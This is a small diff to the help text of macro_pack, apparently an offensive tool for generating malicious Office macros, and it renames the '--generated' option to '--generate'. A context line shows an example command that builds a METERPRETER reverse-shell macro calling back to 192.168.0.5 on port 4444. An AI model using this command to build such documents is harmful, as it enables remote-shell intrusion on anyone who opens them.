@@ -275,7 +275,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
         Help for template usage: macro_pack.exe -t help
          
          
-    -G, --generated=OUTPUT_FILE_PATH. Generates a file containing the macro. Will guess the format based on extension.
+    -G, --generate=OUTPUT_FILE_PATH. Generates a file containing the macro. Will guess the format based on extension.
         Supported extensions are: vba, vbs, hta, doc, docm, xls, xlsm, pptm, vsd, vsdm.
         Note: Apart from vba which is a text files, all other requires Windows OS with right MS Office application installed.
     
